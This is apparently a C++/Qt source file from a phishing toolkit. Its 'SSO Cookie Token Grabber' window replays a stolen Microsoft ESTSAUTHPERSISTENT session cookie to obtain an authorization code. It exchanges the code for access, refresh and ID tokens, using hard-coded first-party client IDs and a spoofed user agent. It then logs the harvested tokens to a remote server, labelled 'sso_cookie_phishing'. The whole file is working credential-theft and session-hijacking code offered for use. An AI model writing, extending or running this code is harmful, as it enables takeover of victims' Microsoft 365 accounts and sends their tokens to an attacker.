// SsoCookieTokenWindow.cpp
#include "SsoCookieTokenWindow.h"
#include "ClientTransport.h"
#include "NetworkHelper.h"
#include "../shared/Protocol.h"
#include <QJsonDocument>
#include <QJsonObject>
#include <QUrl>
#include <QUrlQuery>
#include <QApplication>
#include <QUuid>
#include <QRegularExpression>

SsoCookieTokenWindow::SsoCookieTokenWindow(QWidget* parent) : QWidget(parent) {
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("SSO Cookie Token Grabber");
    resize(700, 600);

    QVBoxLayout* layout = new QVBoxLayout(this);

    layout->addWidget(new QLabel("Client ID"));
    clientIdInput = new QLineEdit();
    layout->addWidget(clientIdInput);

    layout->addWidget(new QLabel("Domain Name (e.g. contoso.com)"));
    domainInput = new QLineEdit();
    layout->addWidget(domainInput);

    layout->addWidget(new QLabel("Resource (e.g. https://graph.microsoft.com/)"));
    resourceInput = new QLineEdit();
    layout->addWidget(resourceInput);

    layout->addWidget(new QLabel("ESTSAUTHPERSISTENT Cookie"));
    cookieInput = new QTextEdit();
    cookieInput->setPlaceholderText("Paste full ESTSAUTHPERSISTENT value here");
    cookieInput->setFixedHeight(60);
    layout->addWidget(cookieInput);

    genButton = new QPushButton("Get Tokens");
    layout->addWidget(genButton);

    layout->addWidget(new QLabel("Output"));
    output = new QTextEdit();
    output->setReadOnly(true);
    layout->addWidget(output);

    setLayout(layout);

    nam = new QNetworkAccessManager(this);
    connect(genButton, &QPushButton::clicked, this, &SsoCookieTokenWindow::handleRequest);
}

void SsoCookieTokenWindow::handleRequest() {
    QString clientId = clientIdInput->text().trimmed();
    QString domain = domainInput->text().trimmed();
    QString resource = resourceInput->text().trimmed();
    // Remove ALL control characters and whitespace that break HTTP headers
    QString cookie = cookieInput->toPlainText();
    cookie.remove(QRegularExpression("[\\x00-\\x1F\\x7F\\s]"));

    if (clientId.isEmpty() || domain.isEmpty() || resource.isEmpty() || cookie.isEmpty()) {
        output->setText("[!] Missing input fields.");
        return;
    }

    pendingClientId = clientId;
    pendingResource = resource;
    pendingCookie = cookie;
    pendingDomain = domain;

    output->append("[*] Requesting auth code...");
    requestAuthCode();
}

void SsoCookieTokenWindow::requestAuthCode() {
    QString redirectUrl = getClientRedirectUrl(pendingClientId, pendingResource);

    QString authUrlStr = QString("https://login.microsoftonline.com/%1/oauth2/v2.0/authorize"
                                 "?redirect_uri=%2"
                                 "&response_type=code"
                                 "&scope=openid+offline_access"
                                 "&response_mode=query"
                                 "&client_id=%3")
                             .arg(pendingDomain, redirectUrl, pendingClientId);

    QNetworkRequest req{ QUrl(authUrlStr) };
    req.setRawHeader("Host", "login.microsoftonline.com");
    req.setRawHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
    req.setRawHeader("Cookie", QByteArray("ESTSAUTHPERSISTENT=") + pendingCookie.toUtf8());
    req.setAttribute(QNetworkRequest::RedirectPolicyAttribute, QNetworkRequest::ManualRedirectPolicy);
    NetworkHelper::setRequestTimeout(req);

    QNetworkReply* authReply = nam->get(req);
    if (!authReply) {
        output->append("[!] Failed to create auth request");
        return;
    }

    connect(authReply, &QNetworkReply::finished, this, [this, authReply]() {
        handleAuthReply(authReply);
    });
}

void SsoCookieTokenWindow::handleAuthReply(QNetworkReply* reply) {
    int status = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
    QByteArray locationHeader = reply->rawHeader("Location");
    reply->deleteLater();

    if (status == 302 && !locationHeader.isEmpty()) {
        QUrl redirect(QString::fromUtf8(locationHeader));
        QString code = QUrlQuery(redirect).queryItemValue("code");

        if (!code.isEmpty()) {
            output->append("[+] Auth code retrieved, exchanging for tokens...");
            QString redirectUrl = getClientRedirectUrl(pendingClientId, pendingResource);
            exchangeCodeForToken(code, pendingClientId, pendingDomain, pendingResource, redirectUrl);
            return;
        }
        output->append("[!] Failed to extract auth code from redirect.");
    } else {
        output->append(QString("[!] Auth request failed (status %1). Cookie may be invalid or expired.").arg(status));
    }
}

void SsoCookieTokenWindow::exchangeCodeForToken(const QString& code, const QString& clientId,
                                                const QString& domain, const QString& resource,
                                                const QString& redirectUrl) {
    // Use domain for token URL, same as Python
    QString tokenUrl = QString("https://login.microsoftonline.com/%1/oauth2/token").arg(domain);

    QUrlQuery params;
    params.addQueryItem("client_id", clientId);
    params.addQueryItem("scope", "openid");
    params.addQueryItem("grant_type", "authorization_code");
    params.addQueryItem("redirect_uri", redirectUrl);
    params.addQueryItem("resource", resource);
    params.addQueryItem("code", code);

    QNetworkRequest req{ QUrl(tokenUrl) };
    req.setRawHeader("Host", "login.microsoftonline.com");
    req.setRawHeader("Content-Type", "application/x-www-form-urlencoded");
    req.setRawHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
    NetworkHelper::setRequestTimeout(req);
    QNetworkReply* reply = nam->post(req, params.toString(QUrl::FullyEncoded).toUtf8());
    if (!reply) {
        output->append("[!] Failed to create token exchange request");
        return;
    }

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        handleTokenReply(reply);
    });
}

void SsoCookieTokenWindow::handleTokenReply(QNetworkReply* reply) {
    QByteArray data = reply->readAll();
    reply->deleteLater();

    QJsonDocument doc = QJsonDocument::fromJson(data);
    if (!doc.isObject()) {
        output->append("[!] Failed to parse token response.");
        return;
    }

    QJsonObject obj = doc.object();
    QString accessToken = obj.value("access_token").toString();
    QString refreshToken = obj.value("refresh_token").toString();
    QString idToken = obj.value("id_token").toString();

    if (!accessToken.isEmpty()) {
        output->append(QString("[Access Token]\n%1\n").arg(accessToken));
        output->append(QString("[Refresh Token]\n%1\n").arg(refreshToken));
        output->append(QString("[ID Token]\n%1\n").arg(idToken));

        // Log token to server
        logTokenToServer(accessToken, refreshToken, idToken, pendingResource);
    } else {
        output->append("[!] Access token missing in response.");
    }
}

QString SsoCookieTokenWindow::getClientRedirectUrl(const QString& clientId, const QString& resource) {
    QString defaultUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    QSet<QString> oobClients{
        "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "29d9ed98-a469-4536-ade2-f981bc1d605e",
        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
    };

    QMap<QString, QString> clientMappings{
        {"1fec8e78-bce4-4aaf-ab1b-5451cc387264", "https://login.microsoftonline.com/common/oauth2/nativeclient"},
        {"9bc3ab49-b65d-410a-85ad-de819febfddc", "https://oauth.spops.microsoft.com/"},
        {"ab9b8c07-8f02-4f72-87fa-80105867a763", "https://login.windows.net/common/oauth2/nativeclient"},
        {"3d5cffa9-04da-4657-8cab-c7f074657cad", "http://localhost/m365/commerce"},
        {"dd762716-544d-4aeb-a526-687b73838a22", "ms-appx-web://microsoft.aad.brokerplugin/dd762716-544d-4aeb-a526-687b73838a22"}
    };

    if (clientMappings.contains(clientId)) return clientMappings[clientId];
    if (clientId == "29d9ed98-a469-4536-ade2-f981bc1d605e" && resource != "https://enrollment.manage.microsoft.com/")
        return "ms-aadj-redir://auth/drs";
    if (oobClients.contains(clientId)) return "urn:ietf:wg:oauth:2.0:oob";

    return defaultUrl;
}

QObject* SsoCookieTokenWindow::locateTransport() const {
    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
    return nullptr;
}

void SsoCookieTokenWindow::logTokenToServer(const QString &accessToken,
                                            const QString &refreshToken,
                                            const QString &idToken,
                                            const QString &resource)
{
    if (accessToken.isEmpty()) {
        return; // Nothing to log
    }

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        return;
    }

    // Generate a unique session ID for SSO cookie phishing
    QString sessionId = QString("sso_cookie_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", "sso_cookie_phishing");
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty())
        req.insert("refreshToken", refreshToken);
    if (!idToken.isEmpty())
        req.insert("idToken", idToken);
    if (!resource.isEmpty())
        req.insert("resource", resource);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    output->append("[+] Token logged to server.");
}
